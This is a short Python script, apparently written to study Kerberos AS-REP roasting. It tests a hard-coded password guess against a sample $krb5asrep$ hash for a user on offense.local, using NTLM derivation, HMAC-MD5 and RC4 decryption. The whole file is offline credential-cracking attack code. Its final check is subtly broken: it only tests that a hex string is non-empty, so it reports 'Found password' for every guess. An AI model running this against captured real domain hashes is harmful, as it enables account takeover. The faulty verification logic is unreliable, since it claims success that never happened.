import hashlib
import binascii
import hmac
from Crypto.Cipher import ARC4

# Reference:
# https://github.com/HarmJ0y/ASREPRoast/blob/1c94ef12038df1378f5e663fe3b8137e46c60896/tgscrack.go

# https://gist.github.com/gthomas/3452673
def hmac_md5(key: bytes, data: bytes):
    return hmac.new(key, data, 'MD5').hexdigest()


def main():
    password = '123456'
    # asrep_hash = '$krb5asrep$23$spot@offense.local:3171ea207b3a6fdaee52ba247c20362e$56fe7dc0caba8cb7d3a02a140c612a917df3343c01bcdab0b669efa15b29b2aebbfed2b4f3368a897b833a6b95d5c2f1c2477121c8f5e005aa2a588c5ae72aadfcbf1aedd8b7ac2f2e94e94cb101e27a2e9906e8646919815d90b4186367b6d5072ab9edd0d7b85519fbe33997b3d3b378340e3f64caa92595523b0ad8dc8e0abe69dda178d8ba487d3632a52be7ff4e786f4c271172797dcbbded86020405b014278d5556d8382a655a6db1787dbe949b412756c43841c601ce5f21a36a0536cfed53c913c3620062fdf5b18259ea35de2b90c403fbadd185c0f54b8d0249972903ca8ff5951a866fc70379b9da'

    ntlm_hash = hashlib.new('md4', password.encode('utf-16le')).digest()
    print(f"[+] NTLM hash: {ntlm_hash.hex()}")

    x = hmac_md5(ntlm_hash, bytes([8, 0, 0, 0]))
    print(f"[+] HMAC MD5 of bytes([8,0,0,0]) with NTLM hash as key: {x}")

    checksum = bytes.fromhex('3171ea207b3a6fdaee52ba247c20362e')
    enc_data = bytes.fromhex('56fe7dc0caba8cb7d3a02a140c612a917df3343c01bcdab0b669efa15b29b2aebbfed2b4f3368a897b833a6b95d5c2f1c2477121c8f5e005aa2a588c5ae72aadfcbf1aedd8b7ac2f2e94e94cb101e27a2e9906e8646919815d90b4186367b6d5072ab9edd0d7b85519fbe33997b3d3b378340e3f64caa92595523b0ad8dc8e0abe69dda178d8ba487d3632a52be7ff4e786f4c271172797dcbbded86020405b014278d5556d8382a655a6db1787dbe949b412756c43841c601ce5f21a36a0536cfed53c913c3620062fdf5b18259ea35de2b90c403fbadd185c0f54b8d0249972903ca8ff5951a866fc70379b9da')

    y = hmac_md5(bytes.fromhex(x), checksum)
    print(f"[+] Second HMAC-MD5: {y}")

    rc4_cipher = ARC4.new(bytes.fromhex(y))
    decrypted_bytes = rc4_cipher.decrypt(enc_data)

    if hmac_md5(bytes.fromhex(x) , decrypted_bytes):
        print(f"[+] Found password: {password}")


if __name__ == "__main__":
    main()
